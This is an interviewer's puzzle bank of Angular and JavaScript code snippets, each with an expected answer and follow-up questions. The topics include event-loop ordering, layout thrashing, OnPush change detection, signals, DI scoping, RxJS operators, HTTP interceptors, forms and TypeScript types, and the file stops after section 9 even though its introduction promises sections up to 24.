# Puzzle Bank — Senior Angular + JS fundamentals

Every puzzle lives here, including the ones that used to sit at the end of `senior-angular-interview-advanced-en.md`. The theory file stays the bank of **questions**; this is the bank of **code**.

Sections **1–21** mirror the theory numbering: `P4.2` is a puzzle for "4. Dependency Injection", so you can pull a puzzle for the exact question that just came up. Sections **22–24** cover JS fundamentals the theory bank doesn't touch (execution context, type coercion, promises).

**Why puzzles when you already have questions.** A question checks whether someone has *read* about it. A puzzle checks whether they've *seen it in production*. The gap between "I know `shareReplay` keeps the subscription alive" and "I see the leak right here" is exactly where senior begins.

**How to use it:**
- The code is **clean** (no hint comments) — copy it into an editor / share your screen.
- The formula: show the code → "what does it print / what breaks / why?" → **don't give the answer**, listen to the reasoning → follow-up.
- **2–4 min** per puzzle. Sixty seconds of silence is already an answer — move on.
- Listen for **mechanics, not the result**: "I think 2" with no reasoning = guessed; "3, because microtasks drain before the next macrotask" = understands.
- ⭐ — any senior should get it; ⭐⭐ — separates senior from senior+/staff.

**Ready-made 30-minute sets** are at the bottom of this file.

---

## 1. Browser internals & rendering

### P1.1 ⭐ — Script loading order
```html
<script src="a.js"></script>
<script src="b.js" async></script>
<script src="c.js" defer></script>
<script type="module" src="d.js"></script>
<script src="e.js" defer></script>
```
> "What's guaranteed about execution order, and what isn't?"
- **Answer:** `a.js` — **blocks the parser**, runs first, right where it sits. `c.js`, `d.js`, `e.js` — deferred (module = `defer` by default), run **after parsing finishes, in document order** `c → d → e`, before `DOMContentLoaded`. `b.js` (`async`) — **no guarantees at all**: it runs as soon as it lands, which may be before everyone or dead last.
- **Trap:** `async` on a script something else depends on is a source of flaky bugs that never reproduce locally (fast network).
- **Follow-up:** "and CSS?" → `<link rel="stylesheet">` blocks **rendering** (not HTML parsing), because there's no render tree without the CSSOM.

### P1.2 ⭐⭐ — Microtasks starving the renderer
```typescript
function loop() {
  Promise.resolve().then(loop);
}
loop();
```
> "What happens to the page? And if you swap `Promise.resolve().then` for `setTimeout`?"
- **Answer:** the tab **hard-freezes**. The microtask queue must drain **before** rendering, and this one refills itself forever → rendering, click handling, everything — never happens.
- With `setTimeout(loop)` the page stays **alive**: each callback is a separate macrotask, and between them the browser gets to run style/layout/paint and process input. It burns CPU, but the UI isn't blocked.
- **Why this isn't academic:** a recursive promise chain (e.g. polling built on `.then`) produces exactly this in real code. The production version of the same trap is **P1.5** — and that's where people fail to recognize it.

### P1.3 ⭐⭐ — Layout thrashing
```typescript
const boxes = document.querySelectorAll<HTMLElement>('.box');

boxes.forEach(box => {
  box.style.width = box.offsetWidth + 10 + 'px';
});
```
> "There are 500 elements here and the page freezes on this. Why? Rewrite it."
- **Answer:** classic **read-after-write**. `style.width = ...` invalidates layout, and the next `offsetWidth` needs up-to-date geometry → the browser is forced into a **synchronous reflow inside the loop**. 500 iterations = 500 reflows instead of one.
- **Fix:** split the phases — **all reads** first, then **all writes**:
  ```typescript
  const widths = [...boxes].map(b => b.offsetWidth);
  boxes.forEach((b, i) => (b.style.width = widths[i] + 10 + 'px'));
  ```
- **The key follow-up (always ask it):** "But there are still 500 writes — won't layout be computed 500 times again?" → **No, ~1.** The point is the difference between **invalidating** layout and **computing** it. The browser keeps a dirty flag: writing to `style` only **marks** layout dirty, it doesn't compute anything. The actual pass happens either **at the end of the task, before the frame**, or **forced early** if JS reads geometry while the flag is dirty.
  - **Read phase (500 reads):** the first read forces layout **once** (if it was dirty; **zero** if it was clean), and the remaining 499 read ready values off an up-to-date layout tree — no computation.
  - **Write phase (500 writes):** these only set the dirty flag (setting it again is a no-op). During the loop layout is **never computed**.
  - **End of task:** one pass of style → layout → paint → composite. **1–2 passes total instead of 500.**
  - **There are still 500 assignments** — and that's fine, they're cheap (a CSSOM mutation plus a bit). What's expensive is the **layout algorithm** walking the subtree. The optimization isn't "less JS work", it's **collapsing 500 O(n) passes into one**.
  - **Why the original is catastrophic:** layout is **global** — writing to *any* element invalidates the whole tree, so alternating write→read sets and force-flushes the flag 500 times in a row.
  - **Corollary:** `offsetWidth` isn't expensive **by itself**, only **after a write**. Reading geometry in a loop from a clean state is free.
  - **What it's called:** read/write batching (the FastDOM pattern); in production the write phase is often wrapped in `requestAnimationFrame`.
- **Follow-up:** "what else forces layout?" → `offsetTop/Height`, `clientWidth`, `scrollTop`, `getBoundingClientRect()`, `getComputedStyle()`. "And for animation?" → `transform`, because it skips layout and paint entirely (composite only).

### P1.4 ⭐⭐ — Event loop: sync + Promise chain + Observables
```typescript
import { of, from } from 'rxjs';
import { delay } from 'rxjs/operators';

console.log('1');
setTimeout(() => console.log('2'), 0);

Promise.resolve()
  .then(() => console.log('3'))
  .then(() => console.log('4'))
  .catch(() => console.log('err'));

of('5').subscribe(v => console.log(v));
from(Promise.resolve('6')).subscribe(v => console.log(v));
of('7').pipe(delay(0)).subscribe(v => console.log(v));

console.log('8');
```
> "What's the output order? Explain why. Follow-up: what if the first `.then` throws?"
- **Answer:** `1, 5, 8, 3, 6, 4, 2, 7`. Synchronously: `1` → `5` (`of` emits immediately on subscribe) → `8`. Microtasks (queue `[cb3, emit6]`): `cb3`→`3` and **only now** `cb4` is queued → `emit6`→`6` → `cb4`→`4`. Macrotasks: `2`, then `7`.
- **Traps:** `of()` is synchronous (Observable ≠ async); `from(promise)` is a microtask; `delay(0)` is a macrotask (`setTimeout`); `.then().then()` queues callbacks one per tick, so `6`, which was already waiting, slips in between `3` and `4` (not `3, 4, 6`).
- **Follow-up (`throw` in the first `.then`):** `4` **isn't printed** — the error skips the intermediate `.then` straight to `.catch`: `1, 5, 8, 3, 6, err, 2, 7`.

### P1.5 ⭐⭐ — Chunking heavy work into macrotasks
```typescript
@Component({
  template: `<progress [value]="done()" [max]="rows.length"></progress>`,
})
export class ImportComponent {
  done = signal(0);

  async import(rows: Row[]) {
    for (const row of rows) {
      await Promise.resolve();
      this.store.insert(parse(row));
      this.done.update(d => d + 1);
    }
  }
}
```
> "200,000 CSV rows. The developer added `await Promise.resolve()` to 'yield to the browser' and show progress. The progress bar sits at zero and the tab ignores clicks. Why, and how do you fix it?"
- **Answer:** `await Promise.resolve()` schedules a **microtask**, and the microtask queue must drain **before** rendering. Each iteration queues the next microtask into that same not-yet-drained queue → all 200,000 iterations run **inside a single macrotask**. No rendering, no input handling. This is exactly **P1.2**, disguised as "but I did `await`".
- **Worse:** that `await` doesn't merely fail to help — it **adds** 200,000 promises and context switches, making the code **slower** than having no `await` at all.
- **Fix — yield to a MACROtask, and do it in chunks:**
  ```typescript
  const CHUNK = 500;
  const yieldToBrowser = () => new Promise<void>(r => setTimeout(r));

  async import(rows: Row[]) {
    for (let i = 0; i < rows.length; i += CHUNK) {
      const end = Math.min(i + CHUNK, rows.length);
      for (let j = i; j < end; j++) {
        this.store.insert(parse(rows[j]));
      }
      this.done.set(end);
      await yieldToBrowser();
    }
  }
  ```
- **The key follow-up: "so why not yield on every single item?"** → because each macrotask has a cost. Past 5 levels of nesting, `setTimeout` is **clamped to ≥4 ms** → 200,000 × 4 ms ≈ **13 minutes** instead of seconds. Chunk size isn't picked by eyeballing an item count — pick it so the work inside takes **~5 ms**, fitting a frame with room left for rendering.
- **"What replaces `setTimeout`?"** → `MessageChannel` — a macrotask **without the 4 ms clamp** (which is why framework schedulers use it internally); `scheduler.postTask({ priority })` and **`await scheduler.yield()`** (Chrome 129+) — yields but resumes your work **ahead of** other tasks; `requestIdleCallback` for work that can happen "eventually"; `navigator.scheduling.isInputPending()` to yield only when input is actually waiting.
- **Angular specifics:** `this.done.update(...)` per item means 200,000 notifications to the CD scheduler. Update **once per chunk**, and keep the loop inside `runOutsideAngular` if you're zone-based.
- **When chunking is the wrong answer:** if `parse` is pure CPU with no DOM and no Angular services, reach for a **Web Worker** (see P11.1) — the main thread stays 100% free and there's nothing to chunk. The cost is serialization. Chunk when the work **must** live on the main thread.
- **🚩:** "I'll add `async/await` so it won't block." `await` by itself **unblocks nothing** — the only thing that matters is **which queue** you yield into.

---

## 2. Change detection

### P2.1 ⭐ — OnPush + array mutation
```typescript
@Component({
  selector: 'app-list',
  changeDetection: ChangeDetectionStrategy.OnPush,
  template: `@for (item of items; track item.id) { <p>{{ item.name }}</p> }`,
})
class ListComponent {
  @Input() items: Item[] = [];
}

@Component({ template: `<app-list [items]="items" /><button (click)="add()">+</button>` })
class ParentComponent {
  items: Item[] = [{ id: 1, name: 'A' }];
  add() {
    this.items.push({ id: 2, name: 'B' });
  }
}
```
> "We click `+`. Does the second row appear?"
- **Answer: no.** `push` doesn't change the **reference** → as far as Angular is concerned the `items` input is unchanged → `ListComponent` is never marked dirty → its view isn't checked. The parent is checked; the child isn't.
- **Fixes:** a new array `this.items = [...this.items, x]`; or `input()` + `signal`/`update`; or `cdr.markForCheck()` in the child (worse — it smears the responsibility).
- **Follow-up:** "what if `ListComponent` were `Default`?" → it would update, because its view is checked every cycle — which is exactly why people "fix" OnPush by reverting to Default instead of fixing the mutation.

### P2.2 ⭐ — `ExpressionChangedAfterItHasBeenCheckedError`
```typescript
@Component({ template: `{{ label }}` })
class BadgeComponent implements AfterViewInit {
  label = 'draft';
  ngAfterViewInit() {
    this.label = 'published';
  }
}
```
> "Why does it throw, and how do you fix it *properly* (not with `setTimeout`)?"
- **Answer:** `label` changes in `ngAfterViewInit` — after the view has already been checked in this CD cycle; the dev-mode verification pass catches the discrepancy. Correct fixes: move it to `ngOnInit`, or a deliberate `cdr.detectChanges()`. `setTimeout` / `Promise.resolve().then()` is a last resort (it defers to the next tick/microtask, it doesn't fix the cause).
- **Follow-up:** "why isn't there an error in production?" → the verification pass runs **in dev only**. So in production you don't get "all good" — you get a **silently desynced UI**.

### P2.3 ⭐⭐ — Content projection + OnPush
```typescript
@Component({
  changeDetection: ChangeDetectionStrategy.Default,
  template: `<app-card>{{ counter }}</app-card>
             <button (click)="counter++">+</button>`,
})
class ParentComponent { counter = 0; }

@Component({
  selector: 'app-card',
  changeDetection: ChangeDetectionStrategy.OnPush,
  template: `<div class="card"><ng-content></ng-content></div>`,
})
class CardComponent {}
```
> "We click `+`. Does the number inside the card update? Why?"
- **Answer: Yes.** `{{ counter }}` is declared in the parent's template → the projected content belongs to the parent's view and is checked by its CD (`Default`), despite the card being `OnPush`. (If the parent were `OnPush` too and not marked dirty, it wouldn't update.)
- **✅✅:** knows that `ngAfterContentInit/Checked` fire **before** `ngAfterViewInit/Checked`; connects it to `viewProviders` (see P4.3).

### P2.4 ⭐⭐ — A getter in a binding
```typescript
@Component({ template: `<app-child [config]="config" />` })
class HostComponent {
  theme = 'dark';
  get config() {
    return { theme: this.theme };
  }
}
```
> "The child is `OnPush`. Two problems in these three lines. Which?"
- **Answer:**
  1. **`ExpressionChangedAfterItHasBeenCheckedError` in dev**: the getter returns a **new object on every call**, and the verification pass compares with `Object.is` → the value "changed" between passes.
  2. **The child's `OnPush` is defeated**: even in prod the input gets a new reference on every CD → the child is marked dirty **always** and checked every time. No optimization, only overhead.
- **Fix:** `config = { theme: this.theme }` as a field (updated explicitly), or `config = computed(() => ({ theme: this.theme() }))` — memoization gives you a stable reference.

### P2.5 ⭐⭐ — `markForCheck` outside the zone
```typescript
constructor(private zone: NgZone, private cdr: ChangeDetectorRef) {
  this.zone.runOutsideAngular(() => {
    setInterval(() => {
      this.tick = Date.now();
      this.cdr.markForCheck();
    }, 1000);
  });
}
```
> "Will `{{ tick }}` update in the template?"
- **Answer (classic, zone-based < v18):** **no.** `markForCheck` only **marks** the path to the root dirty — it **schedules nothing**. We deliberately left the zone, so nothing triggers a CD tick: the value will appear on someone else's next click.
- **Answer (v18+ / zoneless):** **yes** — the hybrid `ChangeDetectionScheduler` gets notified by `markForCheck` and schedules a CD pass itself, even outside the zone.
- **What I'm actually listening for:** whether the candidate separates "mark dirty" from "run CD". `detectChanges()` runs synchronously right now; `markForCheck()` is just a flag. Anyone who conflates the two doesn't understand OnPush.
- **The right answer today:** high-frequency events outside the zone, state in a `signal`, and no manual CD at all.

---

## 3. Signals

### P3.1 ⭐ — Mutating inside a signal
```typescript
const user = signal({ name: 'Ann', tags: ['a'] });

user.update(u => {
  u.tags.push('b');
  return u;
});
```
> "The template renders `{{ user().tags.length }}`. Does it update?"
- **Answer: no.** `update` returned **the same reference** → the default `equal` (`Object.is`) considers the value unchanged → dependents aren't notified.
- **Fix:** `user.update(u => ({ ...u, tags: [...u.tags, 'b'] }))`.
- **Follow-up:** "what about `set` with a new object holding identical content?" → it **does** notify (different reference). If that's a problem, supply a custom `equal` (see P23.5).

### P3.2 ⭐ — Laziness and memoization
```typescript
const a = signal(1);
const double = computed(() => {
  console.log('calc');
  return a() * 2;
});

a.set(2);
a.set(3);
console.log(double());
console.log(double());
```
> "How many times does `calc` print, and what does the console show?"
- **Answer:** `calc` **once**, then `6`, `6`. `computed` is **lazy**: `set` only marks it dirty (push), the actual recomputation happens **on the first read** (pull), and the result is **cached** until a dependency changes.
- **Trap:** expecting three `calc`s — that's an eager-reactivity model, not signals.
- **Follow-up:** "what if nobody reads `double()`?" → the body **never runs at all**.

### P3.3 ⭐ — An `effect` that writes to its own signal
```typescript
const count = signal(0);
effect(() => {
  console.log('count is', count());
  count.set(count() + 1);
});
```
> "What happens when this runs, and how do you do it properly?"
- **Answer:** an infinite cascade: the `effect` depends on `count` and immediately `set`s it → re-run → `set` again. Writing to a signal the effect depends on is disallowed by default. Derived state belongs in a `computed`, not in "an effect that writes back".
- **Follow-up:** "what if I need to read a signal inside an effect **without** subscribing?" → `untracked()`.

### P3.4 ⭐⭐ — `toSignal` and the injection context
```typescript
@Component({ /* ... */ })
export class UserComponent implements OnInit {
  private http = inject(HttpClient);

  user = toSignal(this.http.get<User>('/api/me'), { initialValue: null });

  ngOnInit() {
    this.orders = toSignal(this.http.get<Order[]>('/api/orders'), { initialValue: [] });
  }
}
```
> "One of the two `toSignal` calls throws at runtime. Which, and why?"
- **Answer:** the one in **`ngOnInit`** — `NG0203: inject() must be called from an injection context`. Field initializers run inside the constructor, i.e. **inside** the injection context; `ngOnInit` is already outside it. `toSignal` injects `DestroyRef` under the hood so it can unsubscribe.
- **Fixes:** hoist it into a field; or pass `{ injector: this.injector }`; or wrap in `runInInjectionContext`.
- **Follow-up:** "why `initialValue`, and what does `requireSync: true` do?" → without them the type is `T | undefined`; `requireSync` is only legal for sources that emit **synchronously** (`BehaviorSubject`), otherwise it throws on creation.

### P3.5 ⭐⭐ — Dynamic dependency graph
```typescript
const showDetails = signal(false);
const details = signal('initial');

const view = computed(() => (showDetails() ? details() : 'collapsed'));
effect(() => console.log('render:', view()));

details.set('updated');
```
> "What does the effect print after `details.set('updated')`?"
- **Answer: nothing.** On the first run `showDetails()` was `false`, so `details()` was **never read** → it isn't in the graph. Changing `details` doesn't touch `view`.
- **✅✅:** the graph is **rebuilt on every run** — after `showDetails.set(true)`, `details` becomes a dependency and later changes do propagate. This isn't a bug; it's why signals don't do useless work (unlike `combineLatest`, which is subscribed to everything all the time).

---

## 4. Dependency Injection

### P4.1 ⭐⭐ — How many `LoggerService` instances?
```typescript
@Injectable({ providedIn: 'root' })
class LoggerService {
  readonly logs: string[] = [];
  log(msg: string) { this.logs.push(msg); }
}

@Component({
  selector: 'app-header',
  template: `<span class="counter">{{ logger.logs.length }}</span>`,
})
class HeaderComponent {
  readonly logger = inject(LoggerService);
}

const routes: Routes = [{
  path: 'admin',
  loadComponent: () => import('./admin.component'),
  providers: [LoggerService],
}];
```
```typescript
// admin.component.ts
@Component({ selector: 'app-admin', template: `...` })
export default class AdminComponent implements OnInit {
  private logger = inject(LoggerService);

  ngOnInit() {
    this.logger.log('admin opened');
  }
}
```
> "`HeaderComponent` is eager, sits on every page, and renders `logs.length`. We navigate to `/admin`. What does the counter in the header show?"
- **Answer: `0`.** The header and the admin screen hold **different instances** of `LoggerService`, so the header will **never** see that entry.
- **Mechanics:** `loadComponent` makes the route lazy → it gets its own **`EnvironmentInjector`**; `providers: [LoggerService]` registers the service **right there**, and resolution from the admin component stops at that injector without ever reaching the root one. The header, meanwhile, got the instance from `providedIn: 'root'`. This is the classic "split singleton" bug — and its worst variant, because nothing errors: both halves work fine, each with its own copy of the state.
- **What to remove:** the `providers: [LoggerService]` line. With `providedIn: 'root'` the service is already a single app-wide instance — and tree-shakable at that.
- **Follow-up:** "what about `providedIn: 'any'`?" → **a separate instance per injector** that asks for it, so every lazy route gets its own — occasionally what you want, almost never what people expect.

### P4.2 ⭐⭐ — `useClass` vs `useExisting`
```typescript
@Injectable()
class ApiService {}

@Component({
  providers: [
    ApiService,
    { provide: LOGGER, useClass: ApiService },
    { provide: TRACER, useExisting: ApiService },
  ],
})
class DashboardComponent {}
```
> "How many `ApiService` objects get created?"
- **Answer: two.** `useClass` means "instantiate **a new** object of this class for this token"; `useExisting` is an **alias** to an already-registered provider (`ApiService`), creating nothing. So `TRACER === inject(ApiService)`, while `LOGGER` is a separate object.
- **Why it matters:** the classic state bug — "why does the logger see different state than the service?". It's also the exact mistake that breaks `ControlValueAccessor` (see P7.4).

### P4.3 ⭐⭐ — `viewProviders` and projected content
```typescript
@Injectable()
class PanelService {}

@Component({
  selector: 'app-panel',
  viewProviders: [PanelService],
  template: `<div class="panel"><ng-content /></div>`,
})
class PanelComponent {}

@Directive({ selector: '[panelItem]' })
class PanelItemDirective {
  private panel = inject(PanelService);
}
```
```html
<app-panel>
  <div panelItem>Item</div>
</app-panel>
```
> "What happens on render?"
- **Answer:** **`NullInjectorError: No provider for PanelService`**. `viewProviders` are visible **only to the component's own view**, while `<div panelItem>` is declared in the **parent's** template and merely projected in — for DI it doesn't belong to the panel's view.
- **Fix:** `providers: [PanelService]` instead — those are visible to both the view and the projected content.
- **So what is `viewProviders` for:** precisely to **hide** your internals from someone else's content (a wrapper component that doesn't want user directives grabbing its internal service).

### P4.4 ⭐⭐ — `@SkipSelf` and hierarchy
```typescript
@Component({
  selector: 'app-node',
  providers: [NodeService],
  template: `<ng-content />`,
})
class NodeComponent {
  self = inject(NodeService);
  parent = inject(NodeService, { skipSelf: true, optional: true });
}
```
```html
<app-node>
  <app-node>
    <app-node></app-node>
  </app-node>
</app-node>
```
> "How many `NodeService` instances? What's in `parent` for the deepest one and for the root?"
- **Answer:** **three** instances (one per component). The deepest one's `parent` is the middle instance; the root's `parent` is **`null`** (thanks to `optional: true`, otherwise `NullInjectorError`).
- **Why this isn't synthetic:** it's how tree-shaped components are built (tree, accordion, nested form groups) — a child finds its immediate parent without a single `@Input`.
- **Follow-up:** "and `@Self`?" → looks **only** in the current injector. "`@Host`?" → walks up but **stops at the component's host element**.

---

## 5. RxJS internals

### P5.1 ⭐ — Cold = N executions
```typescript
const config$ = this.http.get<Config>('/api/config');

config$.subscribe(c => this.applyTheme(c));
config$.subscribe(c => this.applyLocale(c));
```
```html
<div *ngIf="config$ | async as c">{{ c.title }}</div>
<footer>{{ (config$ | async)?.version }}</footer>
```
> "How many HTTP requests hit the server?"
- **Answer: four.** A cold Observable is **unicast**: every subscription starts its **own execution** of the producer. Two `subscribe` calls + two `| async` = 4 requests.
- **Fix:** `shareReplay({ bufferSize: 1, refCount: true })`, or a single subscription in the service, or `resource()`.
- **Follow-up:** "what if everyone unsubscribes and someone subscribes again?" → with `refCount: true` the pipeline **restarts** (a fresh request) — often exactly what you want; without `refCount` the cache is "forever", along with the leak (see P16.1).

### P5.2 ⭐ — The Subject family
```typescript
const subject = new Subject<number>();
subject.next(1);
subject.subscribe(v => console.log('A', v));
subject.next(2);

const behavior = new BehaviorSubject<number>(0);
behavior.next(1);
behavior.subscribe(v => console.log('B', v));

const replay = new ReplaySubject<number>(2);
replay.next(1);
replay.next(2);
replay.next(3);
replay.subscribe(v => console.log('C', v));
```
> "What does the console print, and in what order?"
- **Answer:** `A 2`, `B 1`, `C 2`, `C 3`.
  - `Subject` — no memory: the `1` went nowhere (no subscribers yet).
  - `BehaviorSubject` — hands out the **current** value, which is already `1`, not the initial `0`.
  - `ReplaySubject(2)` — replays the **last two**: `2`, `3` (the first fell out of the buffer).
- **Trap:** "B 0, B 1" — doesn't realize `next` replaces the current value.

### P5.3 ⭐⭐ — The Observable contract
```typescript
const source$ = new Observable<number>(subscriber => {
  const id = setInterval(() => subscriber.next(Date.now()), 1000);
  subscriber.next(1);
  subscriber.complete();
  subscriber.next(2);
});

source$.subscribe({
  next: v => console.log('next', v),
  complete: () => console.log('done'),
});
```
> "What does it print, and what here is a real production bug?"
- **Answer:** it prints `next 1`, `done` — that's all. After `complete()` the subscriber is **stopped** and `next(2)` is ignored (the contract: any number of `next`, then at most one `error` **or** `complete`).
- **The bug:** the function returns no **teardown**, so `setInterval` runs forever — even after `complete`/`unsubscribe`. That's a leaked timer plus leaked references.
- **Fix:** `return () => clearInterval(id);`
- **Follow-up:** "does `finalize` fix it?" → no, `finalize` is *your* completion callback; cleaning up the producer's resource is the producer's job.

### P5.4 ⭐⭐ — Picking the operator for the job
```typescript
this.saveClicks$
  .pipe(mergeMap(() => this.http.post('/api/orders', this.form.value)))
  .subscribe();
```
> "An impatient user clicks Save three times. What happens? Walk me through `switchMap` / `concatMap` / `exhaustMap` — which would you pick and why?"
- **Answer:**
  - `mergeMap` (as written) → **three parallel POSTs → three orders**. A production bug.
  - `switchMap` → cancels the earlier ones **on the client**, but the server may already have processed them → **unsafe** for non-idempotent operations.
  - `concatMap` → three sequential POSTs, still three orders.
  - `exhaustMap` → **ignores clicks while a request is in flight** — the right answer for Save / Login / Pay.
- **Rule of thumb:** `switchMap` for reads (typeahead, filters), `exhaustMap` for writes and double-click protection, `concatMap` when order matters, `mergeMap` only when you genuinely want parallelism.

---

## 6. The HTTP layer

### P6.1 ⭐ — Interceptor order
```typescript
provideHttpClient(withInterceptors([authInterceptor, loggingInterceptor]))
```
> "In what order do they see the request, and in what order the response?"
- **Answer:** Request: `auth` → `logging` (registration order); response: the **reverse**, `logging` → `auth`. The interceptor "onion". The classic confusion is assuming the response travels in the same order as the request.
- **Follow-up:** "where does this bite?" → an interceptor catching 401s must sit so that it sees the response **after** those that transform it; a logger registered first logs the raw response, not the processed one.

### P6.2 ⭐ — Immutable `HttpParams`
```typescript
const params = new HttpParams();
params.set('page', '1');
params.set('size', '20');

this.http.get('/api/users', { params }).subscribe();
```
> "What URL actually goes to the server?"
- **Answer:** `/api/users` — **with no query params at all**. `HttpParams` is **immutable**: `set`/`append` return a **new** instance, and here the result is thrown away.
- **Fix:** `const params = new HttpParams().set('page', '1').set('size', '20');` or the object literal `{ params: { page: 1, size: 20 } }`.
- **Follow-up:** "where else does this bite?" → `HttpHeaders`, and most importantly `HttpRequest`: inside an interceptor you can't mutate `req`, only `req.clone({...})`.

### P6.3 ⭐⭐ — A caching interceptor
```typescript
const cache = new Map<string, HttpEvent<unknown>>();

export const cacheInterceptor: HttpInterceptorFn = (req, next) => {
  const hit = cache.get(req.urlWithParams);
  if (hit) return of(hit);

  return next(req).pipe(tap(e => cache.set(req.urlWithParams, e)));
};
```
> "Find three problems."
- **Answer:**
  1. **It caches everything, including `POST`/`PUT`/`DELETE`** — needs `if (req.method !== 'GET') return next(req);`.
  2. **It caches any event**, not just the final response — `tap` also sees `HttpEventType.Sent` and progress events. Needs `filter(e => e instanceof HttpResponse)`.
  3. **No in-flight deduplication:** two concurrent identical requests both start, because nothing is in the cache yet. You need an in-flight map with `shareReplay({ bufferSize: 1, refCount: true })`.
- **Bonus if they say it unprompted:** no TTL/invalidation, the cache is global and never cleared on logout, and there's no opt-out via `HttpContextToken`.

### P6.4 ⭐⭐ — An auth interceptor with token refresh
```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  const withToken = req.clone({ setHeaders: { Authorization: `Bearer ${auth.token}` } });

  return next(withToken).pipe(
    catchError(err =>
      err.status === 401
        ? auth.refresh().pipe(switchMap(() => next(withToken)))
        : throwError(() => err),
    ),
  );
};
```
> "The page fires 5 parallel requests and the token has just expired. Two bugs — which?"
- **Answer:**
  1. **Refresh race:** all 5 get a 401 and call `auth.refresh()` **in parallel** → 5 refresh calls, each rotating the token, the last one invalidating the previous ones → some retries still fail, and in the worst case the user gets logged out. Fix — **single-flight**: `shareReplay({ bufferSize: 1, refCount: true })` on refresh, or `exhaustMap`, or a `BehaviorSubject<string|null>` + `filter(Boolean) + take(1)` queue.
  2. **Retrying with the stale token:** `next(withToken)` replays a request that still carries the **expired** `Authorization` header. You must re-clone with the fresh token.
- **Follow-up:** "what if the retry 401s too?" → you need a guard against infinite loops (a flag or an `HttpContextToken` meaning "this is already a retry").

---

## 7. Forms

### P7.1 ⭐ — Disabled controls and `value`
```typescript
form = new FormGroup({
  email: new FormControl('a@b.com'),
  plan: new FormControl({ value: 'pro', disabled: true }, Validators.required),
});

submit() {
  console.log(this.form.value, this.form.valid);
}
```
> "What's in the console?"
- **Answer:** `{ email: 'a@b.com' }` and `true`. Two effects of a disabled control: it **drops out of `form.value`**, and its validators **don't run**.
- **Fix:** `this.form.getRawValue()`.
- **Follow-up:** "why does `<input [disabled]="x" formControlName="plan">` log a warning?" → disabled state is owned by the **form model**, not the attribute; two sources of truth means desync.

### P7.2 ⭐ — A `valueChanges` loop
```typescript
this.form.valueChanges.subscribe(v => {
  this.form.patchValue({ total: v.price * v.qty });
});
```
> "What happens?"
- **Answer:** infinite recursion — `patchValue` emits `valueChanges` itself. Best case, the tab hangs; worst case, a stack overflow.
- **Fixes:** `patchValue(..., { emitEvent: false })`; or better, don't keep derived state in the form at all — `total` is a `computed()`/getter, not a control.

### P7.3 ⭐⭐ — Cross-field validation
```typescript
form = new FormGroup({
  password: new FormControl(''),
  confirm: new FormControl('', [matchPasswordValidator]),
});

function matchPasswordValidator(c: AbstractControl): ValidationErrors | null {
  return c.value === c.parent?.get('password')?.value ? null : { mismatch: true };
}
```
> "What's fragile here?"
- **Answer:** the validator lives **on the control** but depends on a sibling. Consequences: (1) during construction `c.parent` is still `null`, so the first run always reports `mismatch`; (2) when **`password`** changes, `confirm`'s validator **doesn't re-run** → the error gets stuck.
- **Fix:** put the validator on the **`FormGroup`**, or explicitly call `confirm.updateValueAndValidity()` on `password.valueChanges`.

### P7.4 ⭐⭐ — A broken `ControlValueAccessor`
```typescript
@Component({
  selector: 'app-rating',
  providers: [{ provide: NG_VALUE_ACCESSOR, useClass: RatingComponent, multi: true }],
  template: `...`,
})
export class RatingComponent implements ControlValueAccessor {
  value = 0;
  writeValue(v: number) { this.value = v; }
  registerOnChange(fn: (v: number) => void) { this.onChange = fn; }
  registerOnTouched(fn: () => void) { this.onTouched = fn; }
}
```
> "`formControlName` is wired up, but the UI never shows the value and the form never sees changes. Why?"
- **Answer:** **`useClass`** creates a **second, separate** instance of `RatingComponent` — that's the one `formControlName` talks to, while the one on screen is the first. `writeValue` is called into the void (same mechanics as P4.2).
- **Fix:** `{ provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => RatingComponent), multi: true }`.
- **Why `forwardRef`:** decorator metadata is evaluated **before** the class exists as a value. `multi: true` because `NG_VALUE_ACCESSOR` is a multi-provider.
- **Bonus:** `setDisabledState` is missing here — `form.disable()` won't affect the custom control.

---

## 8. Component composition

### P8.1 ⭐ — Signal input in the constructor
```typescript
@Component({ selector: 'app-user-card', template: `{{ user().name }}` })
export class UserCardComponent {
  user = input.required<User>();

  constructor() {
    console.log(this.user().name);
  }
}
```
> "What happens?"
- **Answer:** it throws — **`NG0950`**: a required input is read **before** Angular has set it. The constructor runs before input binding.
- **Where to read it:** `ngOnInit`, a `computed()`, or an `effect()` — anywhere the read is **deferred**.
- **Follow-up:** "do you still need `ngOnChanges` with signal inputs?" → usually not: express reactions with `computed`/`effect`.

### P8.2 ⭐⭐ — Duplicated `<ng-content>`
```typescript
@Component({
  selector: 'app-collapsible',
  template: `
    @if (expanded()) {
      <div class="body"><ng-content /></div>
    } @else {
      <div class="preview"><ng-content /></div>
    }
  `,
})
class CollapsibleComponent {
  expanded = signal(false);
}
```
> "Why is this unreliable, and how do you do it properly?"
- **Answer:** projection is **static**: projected nodes are created by the **parent's** template and exist in a single instance. Two `<ng-content>` slots for the same content aren't "two copies"; when the branches toggle, the content behaves unpredictably.
- **The subtler problem:** projected content is **created by the parent regardless** of whether the slot renders. If it contains a heavy component with a request in `ngOnInit`, that request fires even while the block is collapsed.
- **Do this instead:** `<ng-template>` + `ngTemplateOutlet` (genuinely lazy), or keep a single `<ng-content>` and switch the presentation with CSS.

---

## 9. TypeScript

### P9.1 ⭐⭐ — Parameter variance
```typescript
type Handler = (e: Event) => void;

const onClick = (e: MouseEvent) => console.log(e.clientX);

const h: Handler = onClick;
```
> "Does this compile with `strictFunctionTypes: true`? Why?"
- **Answer:** **it doesn't.** Function parameters are **contravariant**: to stand in where `(e: Event) => void` is expected, a function must accept **any** `Event`. `onClick` demands a `MouseEvent` and reads `clientX` — calling it with a `KeyboardEvent` would yield `undefined`. The error is **substantive**, not pedantic.
- **✅✅:** knows that **methods** (`interface { on(e: Event): void }`) are still **bivariant** — a legacy soundness hole. Return types are covariant.

### P9.2 ⭐⭐ — Distributive conditional types
```typescript
type Unwrap<T> = T extends Promise<infer U> ? U : T;
type A = Unwrap<Promise<string> | number>;

type NoNull<T> = T extends null | undefined ? never : T;
type B = NoNull<string | null>;

type C = NoNull<never>;

type Boxed<T> = [T] extends [null | undefined] ? never : T;
type D = Boxed<string | null>;
```
> "What are `A`, `B`, `C`, `D`?"
- **Answer:** `A = string | number`, `B = string`, `C = never`, `D = string | null`.
- **Mechanics:** a naked type parameter in a conditional type is **distributive** — it splits the union and applies the condition to each member. `never` is the **empty union**, so there's nothing to distribute over → the result is `never` (`C`), the classic trap where types silently disappear. Wrapping in a tuple, `[T] extends [U]`, **disables** distribution (`D`).
